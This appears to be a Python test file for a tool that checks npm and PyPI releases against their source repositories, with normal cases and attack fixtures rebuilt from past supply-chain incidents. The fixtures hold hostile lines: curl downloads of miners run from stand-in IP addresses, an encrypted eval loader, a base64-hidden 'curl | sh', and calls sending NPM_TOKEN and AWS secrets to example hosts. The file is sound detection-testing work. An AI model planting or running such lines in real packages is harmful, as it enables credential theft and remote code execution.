"""Supply-chain attacks as they really happened, rebuilt as harmless fixtures (the payloads are inert
stand-ins written for these tests), plus the normal cases that must stay quiet. Everything is served
by a local fake npm / PyPI / GitHub."""

import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from fakeworld import World  # noqa: E402
from provenance import compare, registry, source  # noqa: E402

SHA = "a" * 40
LIB = "module.exports = function pad(s, n) {\n  return String(s).padStart(n);\n};\n"
PKG = {"name": "padkit", "version": "1.0.0", "main": "index.js", "dependencies": {"tiny": "^1.0.0"}}


def check(spec):
    rel = registry.fetch(spec)
    src, tried = source.locate(rel)
    return compare.compare(rel, src, tried)


def kinds(rep, worst="high"):
    return sorted((f.severity, f.kind) for f in rep.findings if compare.RANK[f.severity] <= compare.RANK[worst])


def identity_map(src_path: str, content: str, n_lines: int, extra_unmapped: int = 0) -> str:
    mappings = ";".join(["AAAA"] + ["AACA"] * (n_lines - 1) + [""] * extra_unmapped)
    return json.dumps({"version": 3, "sources": [f"../{src_path}"], "sourcesContent": [content], "mappings": mappings})


class Scenarios(unittest.TestCase):
    def setUp(self):
        self.w = World()
        self.addCleanup(self.w.close)

    def publish(self, files, repo_files=None, **kw):
        repo_files = repo_files if repo_files is not None else {"index.js": LIB, "package.json": json.dumps(PKG, indent=2)}
        self.w.repo("acme/pkg", SHA, repo_files)
        self.w.npm("padkit", "1.0.0", files, git_head=SHA, **kw)

    # ── the normal cases ─────────────────────────────────────────────────
    def test_a_clean_package_matches(self):
        self.publish({"index.js": LIB, "package.json": json.dumps(PKG, indent=2), "README.md": "# padkit"})
        rep = check("npm:padkit@1.0.0")
        self.assertEqual(rep.verdict, "matches")
        self.assertEqual(rep.source.how, "gitHead recorded by npm at publish time")
        self.assertEqual(kinds(rep, "low"), [])

    def test_signed_provenance_commit_is_preferred(self):
        self.w.repo("acme/pkg", "b" * 40, {"index.js": LIB, "package.json": json.dumps(PKG)})
        self.w.npm("padkit", "1.0.0", {"index.js": LIB, "package.json": json.dumps(PKG)}, git_head=SHA, attested_commit="b" * 40)
        rep = check("padkit")
        self.assertEqual(rep.source.ref, "b" * 40)
        self.assertTrue(rep.release.attested)
        self.assertEqual(rep.verdict, "matches")

    def test_falls_back_to_release_tags(self):
        self.w.repo("acme/pkg", "1.0.0", {"index.js": LIB, "package.json": json.dumps(PKG)})
        self.w.npm("padkit", "1.0.0", {"index.js": LIB, "package.json": json.dumps(PKG)})
        rep = check("padkit")
        self.assertEqual((rep.source.ref, rep.source.how), ("1.0.0", "release tag"))
        self.assertIn("acme/pkg@v1.0.0: 404", rep.tried)

    def test_a_build_with_comments_stripped_and_version_stamped_is_quiet(self):
        repo_lib = "// pads a string\n/** docs */\nconst VERSION = '__VERSION__';\n" + LIB
        self.publish({"index.js": "const VERSION = '1.0.0';\n" + LIB, "package.json": json.dumps(PKG)},
                     {"index.js": repo_lib, "package.json": json.dumps(PKG)})
        self.assertEqual(kinds(check("padkit"), "low"), [])

    def test_monorepo_package_is_found_by_its_name(self):
        repo = {"package.json": json.dumps({"name": "root", "private": True}),
                "packages/padkit/package.json": json.dumps(PKG), "packages/padkit/index.js": LIB,
                "packages/other/index.js": "module.exports = 2;\n"}
        self.publish({"index.js": LIB, "package.json": json.dumps(PKG)}, repo)
        rep = check("padkit")
        self.assertEqual(rep.verdict, "matches")

    def test_removed_versions_and_missing_repositories(self):
        self.w.npm("padkit", "1.0.0", {"index.js": LIB}, removed=True)
        with self.assertRaisesRegex(registry.NotFound, "published and then removed"):
            registry.fetch("padkit@1.0.0")
        self.w.npm("lonely", "2.0.0", {"index.js": LIB}, repo=None)
        rep = check("lonely")
        self.assertEqual(rep.verdict, "unverifiable")

    # ── attacks ──────────────────────────────────────────────────────────
    def test_ua_parser_js_style_install_script(self):
        # Oct 2021: hijacked releases added a preinstall that fetched and ran a miner; none of it was in git
        evil = dict(PKG, scripts={"preinstall": "start /B node preinstall.js & node preinstall.js"})
        dropper = ("const { execSync } = require('child_process');\n"
                   "execSync('curl -s http://203.0.113.9/jsextension -o jsextension && ./jsextension -k --tls');\n")
        self.publish({"index.js": LIB, "package.json": json.dumps(evil), "preinstall.js": dropper})
        rep = check("padkit")
        self.assertEqual(rep.verdict, "differs")
        self.assertEqual(kinds(rep), [("critical", "extra"), ("critical", "install-script")])

    def test_event_stream_style_payload_in_the_minified_build(self):
        # Nov 2018: flatmap-stream's npm tarball carried an encrypted payload in index.min.js only
        payload = ("!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,\"hex\").toString()}"
                   "var n=r(e(\"2e2f74\")),o=t.env.npm_package_description;var u=r(\"crypto\").createDecipher(\"aes256\",o),"
                   "a=u.update(n[0],\"hex\",\"utf8\");var f=new module.constructor;f.paths=module.paths,f._compile(a,\"\")}catch(r){}}();")
        self.publish({"index.js": LIB, "index.min.js": "module.exports=function(s,n){return String(s).padStart(n)};" + payload,
                      "package.json": json.dumps(PKG)})
        rep = check("padkit")
        self.assertEqual(rep.verdict, "differs")
        f = next(f for f in rep.findings if f.path == "index.min.js")
        self.assertEqual(f.severity, "high")
        self.assertIn("evaluates decoded data", f.title)

    def test_ultralytics_style_code_injected_into_the_pypi_release(self):
        # Dec 2024: the release workflow was poisoned; the PyPI files carried a miner the repository never had
        clean = "import requests\n\n\ndef download(url, dest):\n    return requests.get(url).content\n"
        evil = clean + ("\nimport subprocess, os\nsubprocess.Popen(['curl', '-sL', 'http://203.0.113.50/xmrig', '-o', '/tmp/.x'])\n"
                        "os.system('chmod +x /tmp/.x && /tmp/.x --donate-level 1')\n")
        self.w.repo("acme/pylib", "v8.3.41", {"ultralytics/utils/downloads.py": clean, "ultralytics/__init__.py": "__version__ = '8.3.41'\n"})
        self.w.pypi("ultralytics", "8.3.41", {"ultralytics/utils/downloads.py": evil, "ultralytics/__init__.py": "__version__ = '8.3.41'\n",
                                              "PKG-INFO": "Metadata-Version: 2.1\n"})
        rep = check("pypi:ultralytics==8.3.41")
        self.assertEqual(rep.verdict, "differs")
        self.assertEqual(kinds(rep), [("critical", "changed")])
        self.assertIn("203.0.113.50", rep.findings[0].detail)

    def test_code_in_a_build_that_its_source_map_does_not_explain(self):
        src_ts = "export function pad(s: string, n: number) {\n  return s.padStart(n);\n}\n"
        built = "export function pad(s, n) {\n  return s.padStart(n);\n}\n"
        injected = "require('child_process').exec(Buffer.from('Y3VybCBldmlsLmV4YW1wbGUvcyB8IHNo','base64').toString());\n"
        self.publish({"dist/index.js": built + injected + "//# sourceMappingURL=index.js.map\n",
                      "dist/index.js.map": identity_map("src/index.ts", src_ts, 3, extra_unmapped=1),
                      "package.json": json.dumps(PKG)},
                     {"src/index.ts": src_ts, "package.json": json.dumps(PKG)})
        rep = check("padkit")
        self.assertEqual(kinds(rep), [("critical", "unmapped")])

    def test_a_clean_build_traces_through_its_source_map(self):
        src_ts = "export function pad(s: string, n: number) {\n  return s.padStart(n);\n}\n"
        built = "export function pad(s, n) {\n  return s.padStart(n);\n}\n"
        self.publish({"dist/index.js": built + "//# sourceMappingURL=index.js.map\n",
                      "dist/index.js.map": identity_map("src/index.ts", src_ts, 3), "package.json": json.dumps(PKG)},
                     {"src/index.ts": src_ts, "package.json": json.dumps(PKG)})
        rep = check("padkit")
        self.assertEqual(rep.piles["traced"], ["dist/index.js"])
        self.assertEqual(rep.verdict, "matches")

    def test_built_from_a_tampered_source(self):
        src_ts = "export function pad(s: string, n: number) {\n  return s.padStart(n);\n}\n"
        tampered = src_ts + "fetch('https://collect.example.net/?t=' + process.env.NPM_TOKEN);\n"
        self.publish({"dist/index.js": "export function pad(s, n) {\n  return s.padStart(n);\n}\n",
                      "dist/index.js.map": identity_map("src/index.ts", tampered, 3), "package.json": json.dumps(PKG)},
                     {"src/index.ts": src_ts, "package.json": json.dumps(PKG)})
        rep = check("padkit")
        self.assertEqual(kinds(rep), [("critical", "map-source")])
        self.assertIn("NPM_TOKEN", rep.findings[0].detail)

    def test_dependency_slipped_in_at_publish_time(self):
        self.publish({"index.js": LIB, "package.json": json.dumps(dict(PKG, dependencies={"tiny": "^1.0.0", "colors-helper": "^2.1.0"}))})
        rep = check("padkit")
        self.assertEqual(kinds(rep), [("high", "dependency")])
        self.assertIn("colors-helper@^2.1.0", rep.findings[0].detail)

    def test_obfuscated_extra_file(self):
        obf = "var " + ",".join(f"_0x{i:04x}=_0x{i + 1:04x}" for i in range(30)) + ";"
        self.publish({"index.js": LIB, "helper.js": obf, "package.json": json.dumps(PKG)})
        self.assertEqual(kinds(check("padkit")), [("high", "extra")])

    def test_a_modified_file_that_reads_secrets_and_calls_home(self):
        evil = LIB + "require('https').get('https://stats.example.org/c?d=' + process.env.AWS_SECRET_ACCESS_KEY);\n"
        self.publish({"index.js": evil, "package.json": json.dumps(PKG)})
        rep = check("padkit")
        self.assertEqual(kinds(rep), [("critical", "changed")])

    def test_wheel_layout_matches_a_src_layout_repository(self):
        code = "def add(a, b):\n    return a + b\n"
        self.w.repo("acme/pylib", "v1.2.0", {"src/mathy/__init__.py": code, "pyproject.toml": "[project]\nname = 'mathy'\n"})
        self.w.pypi("mathy", "1.2.0", {"mathy/__init__.py": code, "mathy-1.2.0.dist-info/METADATA": "Name: mathy\n"}, sdist=False)
        rep = check("pypi:mathy")
        self.assertEqual(rep.verdict, "matches")
        self.assertEqual(rep.piles["identical"], ["mathy/__init__.py"])


if __name__ == "__main__":
    unittest.main()
